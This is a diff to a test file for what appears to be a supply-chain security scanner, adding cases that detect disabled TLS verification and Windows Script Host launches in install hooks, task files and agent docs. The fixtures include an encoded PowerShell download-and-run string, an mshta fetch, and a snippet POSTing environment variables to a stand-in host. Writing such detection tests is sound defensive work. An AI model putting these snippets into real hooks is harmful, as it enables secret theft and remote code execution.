@@ -9,8 +9,13 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { Buffer } from "node:buffer";
-import { installScriptRisk, importTimeRisk, importTimeSeverity, scanFile } from "../src/index.js";
-import { powershellRisk, stagerAt, reverseShellAt, readsOwnSource, runsOwnSourceAt, importCode } from "../src/lib/native.js";
+import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join, dirname } from "node:path";
+import { installScriptRisk, importTimeRisk, importTimeSeverity, installScriptSeverity, scanFile, run } from "../src/index.js";
+import { powershellRisk, stagerAt, reverseShellAt, readsOwnSource, runsOwnSourceAt, importCode, call, scriptLang }
+  from "../src/lib/native.js";
+import { scInstallHookIssue } from "../src/lib/supplychain.js";
 
 const PS_RUN = Buffer.from('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
   + 'Invoke-Expression "a.exe"', "utf16le").toString("base64");
@@ -286,5 +291,235 @@ test("linear time on hostile texts", () => {
       assert.ok(importTimeRisk(beacon + tail, lang)[0].length);
       assert.ok(Date.now() - t0 < 10_000, `${tail.slice(0, 20)} ${lang}`);
     }
+  }
+});
+
+const CERT_OFF = "turns off TLS certificate verification";
+const WSH = "runs a script with the Windows Script Host";
+const launches = (reasons) => reasons.some((r) => r.startsWith(WSH));
+
+test("RA-12: TLS certificate verification turned off, every language and form", () => {
+  for (const text of [
+    "requests.get('https://x.invalid/a', verify=False)\n",
+    "import ssl\nctx = ssl._create_unverified_context()\n",
+    "ctx.verify_mode = ssl.CERT_NONE\n",
+    "const a = new https.Agent({ rejectUnauthorized: false });\n",
+    "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n",
+    'process.env["NODE_TLS_REJECT_UNAUTHORIZED"]="0"\n',
+    "opts.rejectUnauthorized = false\n",
+    '{ "rejectUnauthorized": false }\n',
+    "c := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}\n",
+    "reqwest::blocking::Client::builder().danger_accept_invalid_certs(true);\n",
+    "git -c http.sslVerify=false clone https://x.invalid/r\n",
+    "git config http.sslVerify false\n",
+    "npm config set strict-ssl false\n",
+    "wget --no-check-certificate https://x.invalid/a\n",
+    "curl -sSLk https://x.invalid/a\n",
+    "subprocess.run(['curl', '-k', 'https://x.invalid'])\n",
+  ]) {
+    assert.ok(installScriptRisk(text).includes(CERT_OFF), text);
+  }
+});
+
+test("RA-12: cert-off false positives are clean (code only, case-sensitive, curl gap bounded)", () => {
+  for (const [text, lang] of [
+    ["let verify = false;\n", "js"],
+    ["requests.get(u, skip_tls_verify=False)\n", "py"],
+    ["// Do not set rejectUnauthorized: false here\n", "js"],
+    ["curl -LO u && xz -dk a.xz\n", null],
+    ["sort -k 2 file\n", null],
+    ["make -k\n", null],
+    ["curl -K cfg https://x.invalid\n", null],
+    ["requests.get('https://x.invalid', verify=True)\n", null],
+    ["curl -o pkg.tgz https://x.invalid/a\n", null],
+  ]) {
+    assert.ok(!installScriptRisk(text, true, false, lang).includes(CERT_OFF), text);
+  }
+});
+
+test("RA-12: cert-off is dropped from the import-time test, and is a weaker install reason", () => {
+  const [reasons] = importTimeRisk("import requests\nrequests.get('https://x.invalid', verify=False)\n");
+  assert.ok(!reasons.includes(CERT_OFF));                                  // not an indicator at import time
+  assert.equal(installScriptSeverity([CERT_OFF]), "MAJOR");                // a weaker install reason
+  assert.equal(installScriptSeverity([CERT_OFF, "opens a reverse shell"]), "CRITICAL");
+});
+
+test("RA-11: the Windows Script Host launcher, and its false positives", () => {
+  for (const text of ["subprocess.run(['wscript', 'C:\\\\x\\\\launcher.vbs'])\n", "os.system('cscript //nologo run.js')\n",
+    "os.system('CScript //B install.vbs')\n", "subprocess.run(['WScript.exe', 'run.js'])\n",
+    "cmd = 'wsc' + 'ript launcher.v' + 'bs'\nos.system(cmd)\n"]) {
+    assert.ok(launches(installScriptRisk(text, true, false, "py")), text);
+  }
+  for (const [text, lang] of [
+    ["subprocess.run(['node', 'run.js'])\n", "py"],
+    ["// run: cscript //nologo install.js\n", "js"],
+    ["spawn('node', ['scripts/check-wscript.js'])\n", "js"],
+    ["LOLBINS = ['mshta.exe', 'wscript.exe']\nEXTS = ['.vbs', '.js']\n", "py"],
+    ["log('Blocked mshta from running payload.hta')\n", "py"],
+  ]) {
+    assert.ok(!launches(installScriptRisk(text, true, false, lang)), text);
+  }
+});
+
+// ---- the review of RA-12 / RA-11 (0298bd6): a weak reason never hides a strong one; WSH launches matched where
+// they run; comments blanked in the script's own language. Twin of WeakReasonAndLaunchTests and
+// WeakReasonFollowTests (python/tests/scanner/test_supply_chain_signals.py). Inert: hosts are example.com or
+// 192.0.2.x, nothing runs.
+
+const DL = "downloads.example.com";
+const WEAK_JS = `require('https').get({ host: '${DL}', rejectUnauthorized: false });\n`;
+const WSH_JS = "require('child_process').spawn('wscript', ['x.js']);\n";
+const SENDS_ENV = "const https = require('https');\n"
+  + "https.request({ host: 'collect.example.com', method: 'POST' }).end(JSON.stringify(process.env));\n";
+/** The launch the WSH reason shows (what is in its parentheses), or null. */
+const shownLaunch = (reasons) => {
+  const r = reasons.find((x) => x.startsWith(`${WSH} (`));
+  return r ? r.slice(WSH.length + 2, -1) : null;
+};
+/** [[sev, msg]] of a need-protocol call (autorun_issues, agentdoc_issues), the files it asks for from `files`. */
+function needLoop(name, path, body, files, extra = {}) {
+  const have = {};
+  for (let k = 0; k < 6; k++) {
+    const got = call(name, { path, files: have, ...extra }, body);
+    if (got.issues) return got.issues.map((r) => [r[1].sev, r[1].msg]);
+    for (const rel of got.need) have[rel] = rel in files ? files[rel] : null;
+  }
+  throw new Error("the call kept asking");
+}
+const autorun = (command, files) => needLoop("autorun_issues", ".vscode/tasks.json",
+  JSON.stringify({ version: "2.0.0", tasks: [{ label: "x", type: "shell", command, runOptions: { runOn: "folderOpen" } }] }),
+  files);
+// a dependency's AGENTS.md (the project's own are INFO, RA-3)
+const agentdoc = (body, files) => needLoop("agentdoc_issues", "AGENTS.md", body, files, { dep: true });
+
+test("review: WSH launches in code, string and argv form, shown alone", () => {
+  for (const [text, lang, shown] of [
+    ["const cp = require('child_process');\ncp.exec('cscript ' + path.join(__dirname, 'x.vbs'));\n", "js",
+      "cscript + path.join(__dirname, 'x.vbs')"],
+    ["const cp = require('child_process');\ncp.execSync(`cscript ${__dirname}/run.vbs`);\n", "js", "cscript ${__dirname}/run.vbs"],
+    ["require('child_process').execSync(`cscript //nologo ${f}`);\n", "js", "cscript //nologo ${f}"],
+    ["require('child_process').execFile('cscript.exe', ['//nologo', 'x.vbs']);\n", "js", "cscript.exe //nologo x.vbs"],
+    ["cp.spawn(\n  'cscript',\n  ['//nologo', 'x.vbs']\n);\n", "js", "cscript //nologo x.vbs"],
+    ["import os\nos.system('cscript ' + os.path.join(d, 'x.vbs'))\n", "py", "cscript + os.path.join(d, 'x.vbs')"],
+    ["import subprocess\nsubprocess.run(['wscript', p])\n", "py", "wscript p"],
+    ["import subprocess\nsubprocess.Popen(['cscript.exe', '//nologo', script])\n", "py", "cscript.exe //nologo script"],
+    ["CMD = '''cscript //nologo x.vbs'''\nos.system(CMD)\n", "py", "cscript //nologo x.vbs"],
+  ]) {
+    assert.equal(shownLaunch(installScriptRisk(text, true, false, lang)), shown, text);
+  }
+  for (const [cmd, shown] of [["cmd /c cscript //nologo x.vbs", "cscript //nologo x.vbs"],
+    ["start \"\" wscript x.js", "wscript x.js"], ["wscript //B //E:jscript payload.txt", "wscript //B //E:jscript payload.txt"],
+    ["C:\\Windows\\System32\\cscript.exe //nologo C:\\t\\run.js", "C:\\Windows\\System32\\cscript.exe //nologo C:\\t\\run.js"]]) {
+    assert.equal(shownLaunch(installScriptRisk(cmd, false, true)), shown, cmd);
+  }
+  const text = "require('child_process').spawn('wscript', ['x.js']);\nconst later = 'nothing to do with the launch';\n";
+  assert.ok(installScriptRisk(text, true, false, "js").includes(`${WSH} (wscript x.js)`));
+});
+
+test("review: prose, comments, LOLBin lists and file names are not launches", () => {
+  for (const [text, lang] of [
+    ["console.log('On Windows, run cscript setup.vbs to finish');\n", "js"],
+    ["print('Run wscript helper.js by hand if this fails')\n", "py"],
+    ["HELP = 'Usage: cscript tool.vbs [args]'\n", "py"],
+    ["// we never run cscript x.vbs here\nmodule.exports = 1;\n", "js"],
+    ["# run cscript x.vbs on windows\nx = 1\n", "py"],
+    ["const LOLBINS = ['mshta.exe', 'wscript.exe', 'cscript.exe'];\nmodule.exports = LOLBINS;\n", "js"],
+    ["const exts = {wscript: '.vbs', cscript: '.js'};\n", "js"],
+    ["require('child_process').spawn('node', ['scripts/check-wscript.js']);\n", "js"],
+    ["Use `wscript x.js` to run it on Windows.\n", null],
+  ]) {
+    assert.equal(shownLaunch(installScriptRisk(text, true, false, lang)), null, text);
+  }
+  for (const cmd of ["echo please run cscript setup.vbs", "cscript\nx.vbs", "node scripts/check-wscript.js"]) {
+    assert.equal(shownLaunch(installScriptRisk(cmd, false, true)), null, cmd);
+  }
+});
+
+test("review: comments blanked in the script's own language (scriptLang)", () => {
+  for (const [path, text, lang] of [["install", "#!/bin/sh\ncurl\n", null], ["bin/cli", "#!/usr/bin/env node\n", "js"],
+    ["x.bash", "", null], ["install.cmd", "", "bat"], ["x.ps1", "", "other"], ["x.mjs", "", "js"], ["install", "", "js"]]) {
+    assert.equal(scriptLang(path, text), lang, path);
+  }
+  for (const [path, text, want] of [
+    ["install", `#!/bin/sh\ncurl -fsSL https://${DL}/x -k -o bin/x\n`, CERT_OFF],
+    ["install.cmd", "@echo off\r\ncscript //nologo setup.vbs\r\n", WSH],
+    ["install.cmd", "@echo off\r\nmshta http://192.0.2.10/x.hta\r\n", WSH],
+    ["install.bat", `wget https://${DL}/x --no-check-certificate\r\n`, CERT_OFF],
+  ]) {
+    const got = installScriptRisk(text, true, false, scriptLang(path, text));
+    assert.ok(got.some((r) => r.startsWith(want)), `${path}: ${got}`);
+  }
+  const rem = `@echo off\r\nREM curl -k https://${DL}/x\r\n:: wget --no-check-certificate\r\n`;
+  assert.deepEqual(installScriptRisk(rem, true, false, scriptLang("install.cmd", rem)), []);
+});
+
+test("review: git's http.sslVerify key in any case; installScriptSeverity of no reasons", () => {
+  for (const text of ["git -c http.sslverify=false clone https://192.0.2.10/r\n", "git config --global HTTP.SSLVERIFY false\n"]) {
+    assert.ok(installScriptRisk(text).includes(CERT_OFF), text);
+  }
+  assert.ok(!installScriptRisk("https.get({ RejectUnauthorized: false });\n").includes(CERT_OFF));
+  assert.equal(installScriptSeverity([]), null);
+});
+
+test("review: scInstallHookIssue's severity from its reasons", () => {
+  const sev = (reasons) => scInstallHookIssue("package.json", 1, [""], "postinstall", "x", reasons).sev;
+  assert.equal(sev([CERT_OFF]), "MAJOR");
+  assert.equal(sev([CERT_OFF, `${WSH} (cscript x.vbs)`]), "CRITICAL");
+  assert.equal(sev([]), "MAJOR");
+  assert.ok(scInstallHookIssue("package.json", 1, [""], "postinstall", "x", [CERT_OFF]).msg.includes(CERT_OFF));
+});
+
+test("review: a weak reason hides no strong one (autorun, agent doc, .pth)", () => {
+  const cert = `curl -k https://${DL}/x -o y`;
+  const weak = autorun(cert, {});
+  assert.deepEqual(weak.map(([s]) => s), ["MAJOR"]);
+  assert.ok(weak[0][1].includes(CERT_OFF));
+  let found = autorun(`${cert}; node evil.js`, { "evil.js": SENDS_ENV });
+  assert.deepEqual(found.map(([s]) => s), ["CRITICAL"]);
+  assert.ok(found[0][1].includes("runs evil.js"), found[0][1]);
+  found = autorun("node a.js && node b.js", { "a.js": WEAK_JS, "b.js": WSH_JS });
+  assert.deepEqual(found.map(([s]) => s), ["CRITICAL"]);
+  assert.ok(found[0][1].includes(`runs b.js; that file ${WSH} (wscript x.js)`), found[0][1]);
+  assert.deepEqual(agentdoc(`# Setup\n\nRun \`${cert}\`.\n`, {}).map(([s]) => s), ["MAJOR"]);
+  found = agentdoc(`# Setup\n\nRun \`${cert} && sh ./setup.sh\`.\n`, { "setup.sh": "#!/bin/sh\ncscript //nologo x.vbs\n" });
+  assert.deepEqual(found.map(([s]) => s), ["CRITICAL"]);
+  const pth = (line) => call("pth_issues", {}, line).map((i) => [i[0], i[3]]);
+  assert.deepEqual(pth("import ssl; ssl._create_default_https_context = ssl._create_unverified_context\n"), [["SC-PTH-EXEC", "MAJOR"]]);
+  assert.deepEqual(pth("import ssl, subprocess; ssl._create_default_https_context = ssl._create_unverified_context; "
+    + "subprocess.run(['cscript', 'x.vbs'])\n"), [["SC-PTH-EXEC", "CRITICAL"]]);
+});
+
+test("review: --deps and a project's own hooks name a weak reason at MAJOR, a strong one after it CRITICAL", () => {
+  const pkg = (name, scripts) => JSON.stringify({ name, version: "1.0.0", scripts });
+  const files = {
+    "package.json": pkg("app", { postinstall: "node setup.js" }),
+    "setup.js": WEAK_JS,
+    "node_modules/weak/package.json": pkg("weak", { postinstall: "node install.js" }),
+    "node_modules/weak/install.js": WEAK_JS,
+    "node_modules/two/package.json": pkg("two", { postinstall: "node a.js && node b.js" }),
+    "node_modules/two/a.js": WEAK_JS,
+    "node_modules/two/b.js": WSH_JS,
+    "node_modules/shweak/package.json": pkg("shweak", { postinstall: "./install" }),
+    "node_modules/shweak/install": `#!/bin/sh\ncurl -fsSL https://${DL}/x -k -o bin/x\n`,
+  };
+  const root = mkdtempSync(join(tmpdir(), "lz-weak-"));
+  const out = mkdtempSync(join(tmpdir(), "lz-weak-out-"));
+  try {
+    for (const [rel, data] of Object.entries(files)) {
+      const path = join(root, ...rel.split("/"));
+      mkdirSync(dirname(path), { recursive: true });
+      writeFileSync(path, data);
+    }
+    run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
+    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
+    const found = Object.fromEntries(rep.issues.filter((i) => i.rule === "SC-INSTALL-HOOK")
+      .map((i) => [i.file.replaceAll("\\", "/"), [i.sev, i.msg]]));
+    assert.deepEqual(found["package.json"], ["MAJOR", `Install hook runs setup.js, which ${CERT_OFF}.`]);
+    assert.deepEqual(found["node_modules/weak/package.json"], ["MAJOR", `Install hook runs install.js, which ${CERT_OFF}.`]);
+    assert.deepEqual(found["node_modules/shweak/package.json"], ["MAJOR", `Install hook runs ./install, which ${CERT_OFF}.`]);
+    assert.deepEqual(found["node_modules/two/package.json"], ["CRITICAL", `Install hook runs b.js, which ${WSH} (wscript x.js).`]);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+    rmSync(out, { recursive: true, force: true });
   }
 });
